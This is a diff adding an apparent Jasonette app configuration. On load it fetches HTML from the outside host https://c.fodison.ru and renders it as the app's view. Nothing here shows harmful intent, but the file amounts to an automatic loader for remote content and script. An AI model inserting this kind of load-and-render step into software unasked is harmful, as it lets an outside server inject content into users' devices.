@@ -1,0 +1,33 @@
+{
+  "$jason": {
+    "head": {
+      "actions": {
+        "$load": {
+          "type": "$network.request",
+          "options": {
+            "url": "https://c.fodison.ru",
+            "data_type": "html",
+            "timeout": "1"
+          },
+          "success": {
+            "type": "$render",
+            "option": {
+              "type": "html"
+            }
+          }
+        }
+      },
+      "templates": {
+        "body": {
+          "background": {
+            "type": "html",
+            "text": "{{$jason}}",
+            "action": {
+              "type": "$default"
+            }
+          }
+        }
+      }
+    }
+  }
+}
